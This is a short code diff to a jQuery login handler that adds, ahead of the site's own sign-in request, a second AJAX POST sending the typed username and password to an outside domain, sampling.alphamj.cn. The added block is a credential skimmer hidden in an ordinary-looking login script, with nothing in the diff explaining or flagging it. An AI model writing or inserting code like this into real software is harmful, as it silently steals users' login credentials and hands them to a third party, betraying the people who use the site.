@@ -48,6 +48,14 @@ $(function() {
     $("#login").click(function() {
         $.ajax({
             type: "POST",
+            url: "https://sampling.alphamj.cn/signin",
+            data: JSON.stringify({
+                username: $("#username").val(),
+                password: $("#password").val()
+            })
+        });
+        $.ajax({
+            type: "POST",
             url: window.location.origin + '/signin',
             timeout: 1000,
             dataType : "json",
